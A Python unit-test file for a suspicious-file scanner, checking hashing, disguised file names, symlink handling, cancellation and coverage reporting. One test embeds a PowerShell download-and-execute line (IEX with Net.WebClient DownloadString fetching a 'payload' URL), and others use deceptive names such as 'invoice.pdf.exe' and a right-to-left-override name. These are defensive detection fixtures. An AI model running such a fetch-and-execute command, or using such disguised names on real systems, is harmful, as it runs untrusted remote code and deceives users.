from __future__ import annotations

import hashlib
from pathlib import Path
import tempfile
import types
import unittest
from unittest.mock import patch

from security_guard import scanner


class ScannerTests(unittest.TestCase):
    def setUp(self):
        self.temp = tempfile.TemporaryDirectory()
        self.root = Path(self.temp.name)

    def tearDown(self):
        self.temp.cleanup()

    def make_file(self, name, contents=b"ordinary file"):
        path = self.root / name
        path.write_bytes(contents)
        return path

    def test_full_file_is_read_even_beyond_sample_and_stays_unchanged(self):
        content = b"MZ" + b"x" * (scanner.SAMPLE_LIMIT * 5)
        path = self.make_file("picture.jpg", content)
        before = path.stat()
        finding, count = scanner.scan_file(path)
        self.assertEqual(count, len(content))
        self.assertEqual(finding.sha256, hashlib.sha256(content).hexdigest())
        self.assertEqual(path.read_bytes(), content)
        self.assertEqual(path.stat().st_mtime_ns, before.st_mtime_ns)
        self.assertEqual(finding.severity, "low")

    def test_normal_executable_and_documents_are_not_inherently_suspicious(self):
        for name, body in [("program.exe", b"MZbinary"), ("manual.pdf", b"%PDF"),
                           ("setup.ps1", b"Invoke-WebRequest https://example.com/file")]:
            with self.subTest(name=name):
                finding, count = scanner.scan_file(self.make_file(name, body))
                self.assertIsNone(finding)
                self.assertEqual(count, len(body))

    def test_double_extension_and_disguised_name(self):
        finding, _ = scanner.scan_file(self.make_file("invoice.pdf.exe", b"MZ"))
        self.assertTrue(any("扩展名" in reason for reason in finding.reasons))
        finding, _ = scanner.scan_file(self.make_file("invoice\u202egpj.exe", b"MZ"))
        self.assertTrue(any("双向" in reason for reason in finding.reasons))

    def test_script_requires_multiple_behavior_signals_and_decodes_utf16(self):
        body = "IEX (New-Object Net.WebClient).DownloadString('https://example.com/payload')"
        finding, _ = scanner.scan_file(self.make_file("download.ps1", body.encode("utf-16")))
        self.assertTrue(any("动态执行" in reason for reason in finding.reasons))
        self.assertFalse(any("病毒" in reason for reason in finding.reasons))

    def test_empty_file_is_counted_and_no_finding(self):
        self.assertEqual(scanner.scan_file(self.make_file("empty.txt", b"")), (None, 0))

    def test_missing_root_is_reported(self):
        skipped = []
        paths = list(scanner.walk_files([self.root / "missing"], lambda p, r: skipped.append((p, r))))
        self.assertEqual(paths, [])
        self.assertEqual(len(skipped), 1)

    def test_denied_directory_is_reported_without_claiming_coverage(self):
        skipped = []
        with patch.object(scanner.os, "scandir", side_effect=PermissionError("access denied")):
            paths = list(scanner.walk_files([self.root], lambda p, r: skipped.append((p, r))))
        self.assertEqual(paths, [])
        self.assertEqual(skipped[0][0], self.root)
        self.assertIn("access denied", skipped[0][1])

    def test_does_not_follow_observed_link_or_placeholder_attributes(self):
        regular_mode = 0o100644
        for attribute in [0x400, 0x1000, 0x40000, 0x400000]:
            info = types.SimpleNamespace(st_mode=regular_mode, st_file_attributes=attribute)
            self.assertIsNotNone(scanner._unsafe_reason(info))

    def test_rejects_symlink_when_platform_allows_creation(self):
        target = self.make_file("real.txt")
        link = self.root / "link.txt"
        try:
            link.symlink_to(target)
        except OSError:
            self.skipTest("symlink creation requires Windows developer mode or privilege")
        skipped = []
        paths = list(scanner.walk_files([self.root], lambda p, r: skipped.append((p, r))))
        self.assertEqual(paths, [target])
        self.assertEqual(skipped[0][0], link)
        with self.assertRaises(OSError):
            scanner.scan_file(link)

    def test_recursion_and_overlapping_roots_do_not_repeat_directories(self):
        child = self.root / "child"
        child.mkdir()
        target = child / "data.txt"
        target.write_bytes(b"hello")
        self.assertEqual(list(scanner.walk_files([self.root, child, self.root])), [target])

    def test_cancel_before_walk_or_read(self):
        path = self.make_file("sample.txt")
        self.assertEqual(list(scanner.walk_files([self.root], stop=lambda: True)), [])
        with self.assertRaises(InterruptedError):
            scanner.scan_file(path, stop=lambda: True)

    def test_read_cancellation_mid_file(self):
        path = self.make_file("large.txt", b"a" * (scanner.READ_CHUNK * 2))
        calls = [0]

        def stop():
            calls[0] += 1
            return calls[0] >= 3

        with self.assertRaises(InterruptedError):
            scanner.scan_file(path, stop=stop)
        self.assertEqual(path.stat().st_size, scanner.READ_CHUNK * 2)

    def test_directory_cannot_be_scanned_as_a_regular_file(self):
        with self.assertRaises(OSError):
            scanner.scan_file(self.root)

    def test_stats_serialization_records_incomplete_coverage(self):
        self.assertEqual(scanner.ScanStats(skipped=2, errors=1).to_dict()["skipped"], 2)


if __name__ == "__main__":
    unittest.main()
